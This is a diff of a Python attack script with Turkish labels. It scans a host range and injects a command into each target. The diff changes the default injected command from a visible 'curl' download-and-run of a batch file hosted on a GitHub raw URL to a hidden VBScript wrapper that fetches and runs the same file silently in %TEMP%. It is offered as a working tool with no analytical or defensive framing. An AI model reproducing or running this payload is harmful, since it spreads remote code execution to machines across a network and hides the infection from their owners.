@@ -264,12 +264,13 @@ def main():
     parser.add_argument("--end", type=int, default=254, help="Bitis host")
     parser.add_argument("--server-port", type=int, default=34285, help="Sunucu TCP portu")
 
-    # Burasi GUNCELLENDI:
     parser.add_argument(
-        "--command",
-        default='cmd /c curl -o %TEMP%\\nettt.bat https://raw.githubusercontent.com/seition2doc/dosta2/main/nettt.bat && %TEMP%\\nettt.bat',
-        help="Enjekte edilecek komut"
-    )
+    "--command",
+    default='echo Set objShell = CreateObject("WScript.Shell") > %TEMP%\\runner.vbs && echo objShell.Run "cmd /c curl -L -o %TEMP%\\nettt.bat https://raw.githubusercontent.com/seition2doc/dosta2/main/nettt.bat && %TEMP%\\nettt.bat", 0, False >> %TEMP%\\runner.vbs && wscript %TEMP%\\runner.vbs',
+    help="Enjekte edilecek komut"
+)
+
+
 
     parser.add_argument("--timeout", type=int, default=30, help="Hedef basina zaman")
     parser.add_argument("--max-threads", type=int, default=5, help="Ayni anda kac hedef?")
@@ -313,4 +314,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
